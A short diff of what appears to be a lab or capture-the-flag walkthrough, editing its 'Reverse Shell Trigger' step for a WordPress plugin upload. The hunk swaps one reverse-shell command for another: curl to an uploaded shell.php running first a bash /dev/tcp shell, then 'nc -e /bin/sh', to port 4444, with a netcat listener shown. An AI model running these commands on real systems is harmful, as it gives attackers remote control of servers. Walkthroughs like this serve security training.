@@ -141,7 +141,7 @@ nc -lvnp 4444
 ### 6.2 Reverse Shell Trigger
 
 ```bash
-curl "http://gridloy.hv/wp-content/uploads/wpr-addons/forms/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'"
+curl "http://gridloy.hv/wp-content/uploads/wpr-addons/forms/shell.php?cmd=nc -e /bin/sh "ip" 4444"
 ```
 
 📸 **Screenshot 6:** Reverse shell as `www-data`
